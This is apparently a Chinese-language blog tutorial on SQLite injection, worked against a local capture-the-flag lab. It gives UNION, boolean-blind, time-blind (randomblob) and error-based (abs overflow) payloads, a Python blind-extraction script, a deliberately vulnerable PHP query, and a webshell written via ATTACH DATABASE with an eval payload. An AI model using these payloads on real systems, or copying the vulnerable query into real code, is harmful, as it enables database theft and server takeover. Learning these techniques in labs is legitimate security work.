---
title: SQLite注入
date: 2026-07-23 13:30:00
tags: [SQLite, SQL注入, 数据库安全, Web安全]
categories: Web安全
comments: true
---

# 一.SQLite注入攻击

搞清楚SQLite注入之前，我们需要清楚SQLite的数据库结构：

SQLite数据库独特的点在于：一个.db文件对应一个数据库，一个数据库中有若干个表

```
                     sqlitr结构：
                     test.db
|sqlite_master（tables1）| |tables2| |tables3| .... 
```

 主表为sqlite_master ，sqlite_master中有若干字段，存储着以下信息：

| 列名         | 类型    | 描述                                                         |
| ------------ | ------- | ------------------------------------------------------------ |
| **type**     | TEXT    | 对象类型，可以是 `'table'`、`'index'`、`'view'`、`'trigger'` 之一 |
| **name**     | TEXT    | 对象的名称（如表名、索引名、视图名等）                       |
| **tbl_name** | TEXT    | 对象所属的表名（对于表和视图，`tbl_name` 等于 `name`；对于索引和触发器，`tbl_name` 是该索引/触发器所依附的表名） |
| **rootpage** | INTEGER | 对象在数据库文件中的根页号（B-tree 根页），一般不用于注入    |
| **sql**      | TEXT    | 创建该对象的 SQL 语句（`CREATE TABLE/INDEX/VIEW/TRIGGER` 的完整 DDL） |

这与传统的mysql注入有很大的差别 ，接下来我们通过kali来做演示：

```sqlite
╭─ /home/kali/Desktop ··················································································· took 1m 55s with root@kali at 07:33:51 ─╮
╰─❯ sqlite3 test_injection1.db                                                                                                                   ─╯

SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)
   ...> ;
sqlite> 


```

sqlite的登入方法为：sqlite3 数据库文件 , 我们登录进sqlite数据并创建了一张名为users的表 包含了id,username,password,created_at字段

我们先通过命令select sql from sqlite_master; 来查询每张表的建表数据（表，列，以及字段名等）这在sqlite注入攻击中也非常重要

```sqlite
sqlite> select sql from sqlite_master;
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)
CREATE TABLE sqlite_sequence(name,seq)
sqlite> 
```

从上面的例子我们可以看到select sql from sqlite_master 让我们成功看到了user表的建表数据

### 0x01 sqlite常规注入攻击

原理和许多sql注入一样，未验证用户输入导致拼接后台数据库查询语句导致非预期查询

类似以下例子：

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['username'])) {
    $username = $_POST['username'];
    $sql = "SELECT * FROM users WHERE username = '$username'";
    try {
        $stmt = $db->query($sql);
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if (count($rows) > 0) {
            $result = $rows;
        } else {
            $result = 'empty';
        }
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
```

username 被拼接到$sql变量中的sql语句导致非预期查询

来到靶场：

{% asset_img image-20260722200739643.png %}

提示让我们输入admin 

{% asset_img image-20260722200815652.png %}

观察执行的sql语句是单引号，使用单引号进行闭合

并使用--将后面的引号注释掉

{% asset_img image-20260722201002349.png %}

接下来使用order by 来判断列数：

{% asset_img image-20260722201049066.png %}

报出错between5 那就说明一共有5列：

{% asset_img image-20260722201159719.png %}

依然使用UNION SELECT 注入 这点和mysql没有区别，1,2,3,4,5都有回显位，我们使用刚刚的语句来爆出初始信息：每张表的建表语句：

{% asset_img image-20260722201409625.png %}

通过语句可以得知一共建了三张表，重点观察第一张secrets表，里面存在flag列：

那么：select flag from secrets; 

{% asset_img image-20260722201716137.png %}

成功获得flag

### 0x02.基于sqlite的布尔盲注

布尔盲注不会有回显的点，只能观察页面的状态来进行判断：

-1' or substr((select group_concat(sql) from sqlite_master),1,1)='C'-- 故意输错-1 ，这样能才能真正观察到数据，否则输入admin' 无论如何页面都是显示成立状态：

{% asset_img image-20260722203217561.png %}

先解释一下payload的相关函数：-1' or substr((select group_concat(sql) from sqlite_master),1,1)='C'--

(select group_concat(sql) from sqlite_master)  用于聚合查询会将多数据用,分割，substr用于截取字符，有3个参数，第一位也就是(select group_concat(sql) from sqlite_master) ,也就是字符串，在sqlite注入中就是通过sql字段查询建表语句，第二个参数1 是建表语句中第一个字母，第三个1也就是截取几个字符 整个Payload的含义就是判断建表语句的第一个字母是否为C

 通过图中回显结果，我们的推测显然是正确的，因此可以写脚本来对其进行爆数据操作：

```python
import urllib.request
import urllib.parse

URL = "http://127.0.0.1:8888/level3.php"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_{}"

def test(payload):
    data = urllib.parse.urlencode({"username": payload}).encode()
    resp = urllib.request.urlopen(URL, data, timeout=10)
    body = resp.read().decode("utf-8", errors="ignore")
    return "欢迎回来" in body

flag = ""
for pos in range(1, 100):
    found = False
    for ch in CHARSET:
        payload = f"admin' AND SUBSTR((SELECT flag FROM secrets),{pos},1)='{ch}' --"
        if test(payload):
            flag += ch
            print(f"[+] ({pos}) {flag}")
            found = True
            break
    if not found:
        print(f"[*] 第 {pos} 位未匹配到，flag 提取完毕")
        break

print(f"\n🏁 Flag: {flag}")
```

### 0x03.sqlite的时间盲注

在sqlite中没有类似于mysql的传统时间延迟函数，而是通过`randomblob()` 生成一个BLOB（二进制大对象）消耗数据库性能导致延迟效果的 randomblob() 的用法为：

randomblob(1); 生成数据大小为1字节的BLOB，我们要想让其产生延迟就要生成字节很大的Blob对象

 来看题目：

{% asset_img image-20260723090049867.png %}

```sqlite
admin' or (case when(substr((select group_concat(sql) from sqlite_master),1,1)='C') then randomblob(300000000) else 0 end)--
```

sqlite中没有if.........else 只能使用case..when ,这个payload的含义是截取sqlite版本的第一个字符判断是否为3，如果是3的话通过 randomblob(300000000)生成超大字节数据造成延迟 

把上面的版本号改一下就可以了 

### 0x04 基于报错的布尔盲注

这里我们需要了解一下abs()函数:

abs函数用于计算绝对值：

```sqlite
sqlite> select abs(1);
1
sqlite> select abs(-1);
1
```

但是当abs()去计算一个特殊值0x8000000000000000 也就是即 -9223372036854775808 会触发溢出错误，我们可以利用这点配合substr就可以达到预期效果：如果第一个字符为正确的值就不会出现任何结果，页面正常 如果字符判断错误则触发整数溢出报错

payload:

```
1 AND abs(CASE WHEN (SUBSTR((SELECT flag FROM secrets),1,1)='f') THEN 0 ELSE 0x8000000000000000 END)
```

 猜对了 → 返回 0 猜错了则触发溢出报错

{% asset_img image-20260723104112147.png %}

flag的第一个字符是"f"  我们将第一个改为a看看会有什么结果：

{% asset_img image-20260723104243729.png %}

可以看到了触发溢出错误，基于这点编写脚本即可

### 0x05 SQLite写入WebShell

开始这点之前 我们需要知道ATTACH DATABASE 该命令用于创建数据库文件除了用sqlite3 xxx.db我们也可以通过这个方法来进行创建数据库文件 也可以进行附加操作

假设存在多个数据库文件 .db的时候  ATTACH  可以指定一个数据库文件附加进当前数据库下 类似mysql的多个数据库的效果

当存在一个a.db的时候，如果没有这个文件则会创建这个文件，如果存在a.db则会附加

语法：

```sqlite
attach [database] filename as database_name;
```

那么如何通过该语句来写Webshell呢？

通过创建数据库文件，再创建表，再将payload插入表中 最后由php解析：

```sqlite
ATTACH DATABASE 'F:\sqlite_injection_lab\shell.php' AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES ('<?php @eval($_POST["x"]); ?>'); --
```

{% asset_img image-20260723121522431.png %}

使用ATTACH DATABASE在F:\sqlite_injection_lab\ 创建一个shell.php 并使用AS 将该数据库起一个shell别名 并创建一个名为exp的字段，并将<?php @eval($_POST["x"]); ?> 插入exp字段中：

现在我们成功创建了shell.php 

{% asset_img image-20260723121426720.png %}

注：使用该攻击的前提是支持堆叠注入，第二点是网站的路径可写
